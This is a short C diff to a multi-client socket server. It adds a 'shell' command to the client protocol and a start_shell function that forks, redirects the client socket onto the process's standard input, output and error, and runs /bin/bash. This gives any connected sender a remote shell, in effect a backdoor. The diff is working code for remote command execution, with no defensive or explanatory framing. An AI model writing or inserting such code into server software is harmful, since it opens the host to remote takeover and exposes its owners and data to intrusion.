@@ -107,6 +107,8 @@ static int		read_client(const SOCKET sd, uint8_t *auth)
 			return (1);
 		else if ((strcmp(buffer, "quit") == 0))
 			return (1);
+		else if ((strcmp(buffer, "shell") == 0))
+			return(2);
 		return (0);
 	}
 	return (0);
@@ -164,7 +166,28 @@ static int		get_client_by_sock(client_t *client, const int len, const SOCKET soc
 	for (int i = 0; i < len; i++)
 	{
 		if (client[i].sock == sock)
-			return (i);
+		return (i);
+	}
+	return (0);
+}
+
+static int		start_shell(const SOCKET sock)
+{
+	pid_t		pid;
+
+	pid = fork();
+	if (pid < 0)
+		return (1);
+	if (pid == 0)
+	{
+		if ((dup2(sock, STDIN_FILENO)) < 0)
+			exit (EXIT_FAILURE);
+		if ((dup2(sock, STDOUT_FILENO)) < 0)
+			exit (EXIT_FAILURE);
+		if ((dup2(sock, STDERR_FILENO)) < 0)
+			exit (EXIT_FAILURE);
+		if ((execl("/bin/bash", "", NULL)) < 0)
+			exit (EXIT_FAILURE);
 	}
 	return (0);
 }
@@ -228,6 +251,10 @@ int			run_server(const SOCKET *sock)
 					{
 						in_close = 1;
 						all_shutdown(client, MAXCLIENT);
+					}
+					else if (ret == 2)
+					{
+						start_shell(i);
 					}
 				}
 			}
